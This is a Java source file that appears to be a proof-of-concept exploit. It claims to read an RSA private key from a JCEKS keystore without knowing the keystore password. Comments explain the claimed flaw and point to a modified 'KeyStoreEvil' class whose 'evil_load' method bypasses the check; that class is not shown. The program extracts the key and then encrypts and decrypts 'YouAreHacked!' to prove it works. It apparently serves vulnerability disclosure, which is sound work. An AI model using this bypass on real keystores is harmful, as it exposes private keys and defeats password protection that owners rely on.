package org.xfei.goldenfingre;

import java.io.FileInputStream;
import java.security.*;
import java.security.interfaces.RSAPrivateCrtKey;
import java.security.spec.RSAPublicKeySpec;
import java.util.Base64;

import hacker.*;

import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

public class Main {
    //generating key: keytool -genkey -alias CERT1 -dname "CN=myCo" -keystore jceks09 -keyalg RSA -keysize 2048 -keypass "999999" -storepass "000000" -storetype JCEKS  -validity 999
    //plz replace below
    public static void main(String[] args) {
        String keystorePath = "C:\\Users\\admin\\Desktop\\tmp\\jceks09";
        if (args != null && args.length > 0) {
            keystorePath = args[0];
        }
        /*
        reading keystore as normal
        */
        System.out.println("used this command to generate keystore: generating key: keytool -genkey -alias CERT1 -dname \"CN=myCo\" -keystore jceks09 -keyalg RSA -keysize 2048 -keypass \"999999\" -storepass \"000000\" -storetype JCEKS  -validity 999");
        System.out.println("-------------------------reading key normally----------------------");
        KeyStore ks1 = null;
        try {
            ks1 = KeyStore.getInstance("JCEKS");
            FileInputStream fis1 = new FileInputStream(keystorePath);
            ks1.load(fis1, "000000".toCharArray());// correct keystore password is 000000
            Key obj = ks1.getKey("cert1", "999999".toCharArray());// correct key password is 999999
            PrivateKey normalKey = (PrivateKey) obj;
            System.out.println("Key algorithm: " + obj.getAlgorithm());
            System.out.println("Key format: " + obj.getFormat());
            System.out.println("Is key destroyed" + normalKey.isDestroyed());
        } catch (Exception e) {
            e.printStackTrace();
        }
        System.out.println("-------------------------hacking----------------------");
        /*
        Below is my POC code of reading secret key without knowing keystore password.
        Technically I can get password hash of keystore as well, the password hash/encrypted value is stored in var41 in engineLoad method
        In summary, the password is read from file and compared with user input, that is why I can bypass keystore password protection.
        Plz check line 492 in JceKeyStoreEvil.java
        */
        try {
            KeyStoreEvil ks = (KeyStoreEvil) KeyStoreEvil.getInstance("JCEKS");
            FileInputStream fis = new FileInputStream(keystorePath);
            //attacker doesn`t need to know the keystore password
            Key secretKey = ks.evil_load(fis, "cert1", "IDon`tNeed".toCharArray(), "999999".toCharArray());
            PrivateKey key = (PrivateKey) secretKey;
            System.out.println("Key algorithm: " + secretKey.getAlgorithm());
            System.out.println("Key format: " + secretKey.getFormat());
            System.out.println("Is key destroyed" + key.isDestroyed());

            RSAPrivateCrtKey privk = (RSAPrivateCrtKey) key;

            RSAPublicKeySpec publicKeySpec = new java.security.spec.RSAPublicKeySpec(privk.getModulus(), privk.getPublicExponent());

            System.out.println("-------------------------Test encryption and decryption----------------------");
            KeyFactory keyFactory = KeyFactory.getInstance("RSA");
            PublicKey myPublicKey = keyFactory.generatePublic(publicKeySpec);
            byte[] encryptedData = encrypt(myPublicKey, "YouAreHacked!");
            System.out.println("Encrypted data: " + Base64.getEncoder().encodeToString(encryptedData));
            String data = decrypt(encryptedData, privk);
            System.out.println("Decrypted data: " + data);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static byte[] encrypt(PublicKey publicKey, String data) throws BadPaddingException, IllegalBlockSizeException, InvalidKeyException, NoSuchPaddingException, NoSuchAlgorithmException {
        Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
        cipher.init(Cipher.ENCRYPT_MODE, publicKey);
        return cipher.doFinal(data.getBytes());
    }

    public static String decrypt(byte[] data, PrivateKey privateKey) throws IllegalBlockSizeException, InvalidKeyException, BadPaddingException, NoSuchAlgorithmException, NoSuchPaddingException {
        Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
        cipher.init(Cipher.DECRYPT_MODE, privateKey);
        return new String(cipher.doFinal(data));
    }
}
